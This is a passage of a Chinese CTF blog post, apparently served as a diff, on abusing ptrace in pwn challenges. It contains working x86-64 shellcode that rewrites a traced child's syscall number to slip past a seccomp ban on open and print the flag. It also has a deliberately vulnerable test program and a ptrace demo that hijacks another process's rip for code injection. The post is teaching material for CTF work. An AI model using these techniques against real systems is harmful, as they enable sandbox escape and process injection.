class="line">/* fork() */</span><br><span class="line">push 0x39</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">/* 判断子进程和主进程 */</span><br><span class="line">test rax, rax</span><br><span class="line"></span><br><span class="line">jz child</span><br><span class="line"></span><br><span class="line">parent:</span><br><span class="line">    /* time delay */</span><br><span class="line">    mov rdx, 0x30000000</span><br><span class="line">    dec rdx</span><br><span class="line">    test rdx, rdx</span><br><span class="line">    jnz $ - 6</span><br><span class="line">    push rax</span><br><span class="line"></span><br><span class="line">    /* waitpid(childpid, NULL, 0) */</span><br><span class="line">    mov rdi, rax</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov r10, 0</span><br><span class="line">    mov rax, 0x3d</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    /* ptrace(PTRACE_SYSCALL, childpid, NULL, NULL) */</span><br><span class="line">    mov rdi, 0x18</span><br><span class="line">    mov rsi, [rsp]</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov r10, 0</span><br><span class="line">    mov rax, 0x65</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    /* waitpid(childpid, NULL, 0) */</span><br><span class="line">    mov rdi, [rsp]</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov r10, 0</span><br><span class="line">    mov rax, 0x3d</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    /* ptrace(PTRACE_GETREGS, childpid, NULL, &amp;regs) */</span><br><span class="line">    mov rdi, 0xc</span><br><span class="line">    mov rsi, [rsp]</span><br><span class="line">    mov rdx, 0x0</span><br><span class="line">    mov r10, rsp</span><br><span class="line">    add r10, 0x400</span><br><span class="line">    mov rax, 0x65</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    /* ptrace(PTRACE_SETREGS, childpid, NULL, &amp;regs) */</span><br><span class="line">    mov rdi, 0xd</span><br><span class="line">    mov rsi, [rsp]</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov r10, rsp</span><br><span class="line">    add r10, 0x400</span><br><span class="line"></span><br><span class="line">    /* 改orig_rax */</span><br><span class="line">    mov qword ptr [r10+0x78], 2</span><br><span class="line">    mov rax, 0x65</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    /* ptrace(PTRACE_DETACH, childpid, NULL, NULL) */</span><br><span class="line">    mov rdi, 0x11</span><br><span class="line">    mov rsi, [rsp]</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov r10, 0</span><br><span class="line">    mov rax, 101</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    /* exit() */</span><br><span class="line">    mov rax, 0x3c</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">child:</span><br><span class="line">    /* ptrace(PTRACE_TRACEME, 0, NULL, NULL) */</span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov r10, 0</span><br><span class="line">    mov rax, 101</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    /* syscall(SYS_gettid) */</span><br><span class="line">    mov rax, 0x27</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    /* syscall(SYS_tkill, pid, SIGSTOP) */</span><br><span class="line">    mov rdi, rax</span><br><span class="line">    mov rsi, 0x13</span><br><span class="line">    mov rax, 0x3e</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    /* push flag  */</span><br><span class="line">    mov r15, 0x67616c66</span><br><span class="line">    push r15</span><br><span class="line">    </span><br><span class="line">    /* open(file=&#x27;rsp&#x27;, oflag=0, mode=0) */</span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    xor rsi, rsi</span><br><span class="line">    /* call open() */</span><br><span class="line">    xor rax, rax</span><br><span class="line">    mov rax, 39 /* getpid */</span><br><span class="line">    syscall</span><br><span class="line">	</span><br><span class="line">	/* sendfile(1,&#x27;rax&#x27;,0,0x100) */</span><br><span class="line">	mov rdi, 1</span><br><span class="line">	mov rsi, rax</span><br><span class="line">	mov rdx, 0</span><br><span class="line">	mov r10, 0x100</span><br><span class="line">	push 0x28</span><br><span class="line">	pop rax</span><br><span class="line">	syscall</span><br></pre></td></tr></table></figure>
+<p>比如此时写一个有漏洞的程序做测试</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc poc.c -o poc -lseccomp -g -w</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sec</span><span class="params">()</span>&#123;</span><br><span class="line">	scmp_filter_ctx ctx;</span><br><span class="line">    ctx = seccomp_init(SCMP_ACT_ALLOW);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(open), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(openat), <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> seccomp_load(ctx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	sec();</span><br><span class="line">	<span class="type">char</span> *ptr = mmap(<span class="number">0x1000000</span>,<span class="number">0x1000</span>,<span class="number">7</span>,<span class="number">34</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">	read(<span class="number">0</span>,ptr,<span class="number">0x1000</span>);</span><br><span class="line">	<span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(</span></span><br><span class="line"><span class="params">		<span class="string">&quot;.intel_syntax noprefix\n&quot;</span></span></span><br><span class="line"><span class="params">		<span class="string">&quot;mov rax, 0x1000000\n&quot;</span></span></span><br><span class="line"><span class="params">		<span class="string">&quot;call rax\n&quot;</span>	</span></span><br><span class="line"><span class="params">		<span class="string">&quot;.att_syntax noprefix\n&quot;</span></span></span><br><span class="line"><span class="params">	)</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>利用结果</p>
+<p><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="https://cdn.jsdelivr.net/gh/sheratan4/picture@main/img/202409051657179.png" alt="ptrace_2"></p>
+<h2 id="利用ptrace修改rip"><a href="#利用ptrace修改rip" class="headerlink" title="利用ptrace修改rip"></a>利用ptrace修改rip</h2><p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-275442.htm">参考</a><br>ptrace既然可以用来修改寄存器，那么也是可以修改rip的，当环境中设置<code>echo 0 &gt; /proc/sys/kernel/yama/ptrace_scope</code>那么就是也许一个进程被另一个进程附加，从而会导致代码注入等危害。<br>下面利用一个demo来验证，还是先贴出代码，分为server（调试方）、client（被调试方）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ptrace_server</span></span><br><span class="line"><span class="comment">// gcc ptrace_server.c -o ptrace_server -g -w</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;input pid:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;pid);</span><br><span class="line">    </span><br><span class="line">    ptrace(PTRACE_ATTACH, pid, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        ptrace(PTRACE_SYSCALL, pid, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        ptrace(PTRACE_GETREGS, pid, <span class="number">0</span>, &amp;regs);</span><br><span class="line">        <span class="keyword">if</span> (regs.orig_rax != <span class="number">0</span>)&#123;</span><br><span class="line">            regs.rip = <span class="number">0x4011e2</span>;</span><br><span class="line">            ptrace(PTRACE_SETREGS, pid, <span class="number">0</span>, &amp;regs);</span><br><span class="line">            ptrace(PTRACE_DETACH, pid, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ptrace_client</span></span><br><span class="line"><span class="comment">// gcc ptrace_client.c -o ptrace_client -g -w -no-pie</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,getpid());</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    read(<span class="number">0</span>,buf,<span class="number">0x20</span>);</span><br><span class="line">    close(<span class="number">0</span>);</span><br><span class="line">    close(<span class="number">1</span>);</span><br><span class="line">    close(<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>cilent关闭了pie为了server设置rip方便，下面是运行结果</p>
+<p><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="https://cdn.jsdelivr.net/gh/sheratan4/picture@main/img/202409051657473.gif" alt="ptrace_3"></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/post/4a17b156.html" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2024-09-05 17:03:19
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ptrace%E5%9C%A8pwn%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-text">ptrace在pwn中的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#seccomp-ret2trace"><span class="toc-text">seccomp ret2trace</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ptrace-%E4%BF%AE%E6%94%B9%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="toc-text">ptrace 修改系统调用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8ptrace%E4%BF%AE%E6%94%B9rip"><span class="toc-text">利用ptrace修改rip</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/sheratan4">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+        <li>
+          
+            <a title="email" href="mailto:sheratan@wgpsec.org">
+              <i class="iconfont icon-envelope"></i>
+            </a>
+            
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/sheratan4">Copyright © 2024 Oranges</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + ptrace%E5%9C%A8pwn%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8 + '&url=' + http%3A%2F%2Fexample.com%2Fpost%2Fc6e8b0b3.html + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/post/c6e8b0b3.html" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  
+        <style>
+            [bg-lazy] {
+                background-image: none !important;
+                background-color: #eee !important;
+            }
+        </style>
+        <script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 1,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>(r=>{r.imageLazyLoadSetting.processImages=t;var a=r.imageLazyLoadSetting.isSPA,o=r.imageLazyLoadSetting.preloadRatio||1,d=i();function i(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(t){(a||t)&&(d=i());for(var e,n=0;n<d.length;n++)0<=(e=(e=d[n]).getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(r.innerHeight*o||document.documentElement.clientHeight*o)&&(()=>{var t,e,a,o,i=d[n];e=function(){d=d.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).dataset.loaded||(t.hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(a=new Image,o=t.getAttribute("data-original"),a.onload=function(){t.src=o,t.removeAttribute("data-original"),t.setAttribute("data-loaded",!0),e&&e()},a.onerror=function(){t.removeAttribute("data-original"),t.setAttribute("data-loaded",!1),t.src=o},t.src!==o&&(a.src=o)))})()}function e(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",e),r.addEventListener("resize",e),r.addEventListener("orientationchange",e)})(this);</script></body>
+</html>
